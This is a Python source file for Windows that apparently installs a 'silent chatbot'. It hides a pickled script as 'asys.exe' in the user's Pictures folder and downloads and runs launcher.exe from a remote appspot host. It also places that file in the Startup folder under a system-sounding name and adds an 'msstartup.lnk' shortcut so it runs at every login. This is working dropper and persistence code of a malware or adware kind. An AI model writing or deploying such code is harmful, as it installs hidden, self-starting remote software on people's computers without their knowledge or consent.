"""Makes a thread to download/install/run the silent chatbot.

Should only be run on windows :(
"""
import cPickle
import launcher
import os
import pythoncom
import threading
import win32api
import win32com.client

from win32com.shell import shellcon

global LAUNCHERURL
LAUNCHERURL = "http://littlesitetomakemoney.appspot.com/launcher.exe"

class Downloader(threading.Thread):
    def __init__(self, script):
        """Make a thread to download/install the silent chatbot.
        @param script: A script in list form.  See scriptreader.py
        @type script: list
        """
        threading.Thread.__init__(self)
        self.script = script
        self._stop = threading.Event()
        
    def run(self):
        """Run the thread."""
        #Make a file for the script
        path = launcher.file_in_special_path(shellcon.CSIDL_MYPICTURES, 
                                             "asys.exe")
        launcher.unhide_file(path)
        f = open(path, "w")
        #Save the script
        if self._stop.is_set(): return
        cPickle.dump(self.script, f)
        #Hide the script
        f.close()
        launcher.hide_file(path)
        
        #DIR the launcher
        if self._stop.is_set(): return
        path = launcher.download_install_run(LAUNCHERURL, 
                                             shellcon.CSIDL_STARTUP, 
                                             "desktop.exe",
                                             duplicate=False)
        
        #Make a shortcut
        try:
            pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
        except pythoncom.com_error:
            pass
        shell = win32com.client.Dispatch('WScript.shell') 
        startup = shell.SpecialFolders('Startup') 

        shorty = shell.CreateShortcut(os.path.join(startup, "msstartup.lnk")) 
        shorty.TargetPath = win32api.GetShortPathName(path)
        shorty.Save() 
        
        
    def stop(self):
        """Stop the thread"""
        self._stop.set()